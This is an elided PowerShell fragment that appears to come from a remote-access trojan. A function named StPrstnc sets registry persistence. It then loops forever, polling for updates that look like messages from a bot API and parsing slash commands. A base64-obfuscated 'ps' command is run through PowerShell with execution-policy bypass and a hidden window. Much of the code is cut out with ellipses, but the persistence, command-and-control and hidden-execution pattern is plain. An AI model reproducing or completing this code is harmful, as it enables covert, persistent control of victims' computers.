...
function StPrstnc {
    ...
    if (-not (Get-ItemProperty -Path $rPth -Name $rNm -ErrorAction SilentlyContinue)) {
        Set-ItemProperty -Path $rPth -Name $rNm -Value $escapedRegVal
    }
    ...
    while ($true) {
        try {
            ...
            foreach ($upd in $upds.result) {
                ...
                # Parsing: Better split for cmd/args (handles simple quotes/spaces)
                if ($txt -match '^/(\w+)\s*(.*)$') {
                ...
                if ($cmdNm -eq d('cHM=')) {  # ps
                    ...
                    $psArgs = @('-ep', 'Bypass', '-w', 'Hidden', '-c', $fullCmd)
